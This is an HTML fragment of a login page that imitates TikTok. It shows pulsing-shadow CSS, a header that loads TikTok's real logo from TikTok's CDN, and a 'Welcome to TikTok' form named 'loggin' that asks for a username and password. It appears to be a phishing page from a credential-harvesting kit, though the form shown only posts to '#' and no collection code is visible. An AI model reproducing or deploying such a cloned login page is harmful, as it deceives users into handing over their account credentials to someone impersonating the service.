    -moz-box-shadow: 0 0 20px rgba(129,183,26,0.5);
    box-shadow: 0 0 20px rgba(129,183,26,0.5);
    -webkit-animation: shadow-pulse 3s infinite ease-in-out;}
@-webkit-keyframes shadow-pulse {
  0% {-webkit-box-shadow: 0 0 20px rgba(129,183,26,0);}
  50% {-webkit-box-shadow: 0 0 20px rgba(129,183,26,1);}
  100% {-webkit-box-shadow: 0 0 20px rgba(129,183,26,0);}}
</style>


  <div id="root"><div class="tiktok-app-container"><header class="tiktok-web-header"><a href="/" class="header-logo" style="background-image: url(&quot;//s16.tiktokcdn.com/web_login/logo_white.a6bdfc2bad32cb645467e008f3c20041.svg&quot;);"></a></header>
        <section>
       <h1>Welcome to TikTok</h1>
            <form method="post" name="loggin" action="#" id="loggin">
                <fieldset>
                    <input id="username" name="login" type="text" placeholder="Username">
                </fieldset>
                <fieldset>
                    <input id="password" name="password" type="password" placeholder="Password">
                </fieldset>
                <fieldset>
                    <input type="submit" name='submit' value="Sign In" />
                </fieldset>
            </form>
        </section>
    </body>
</html>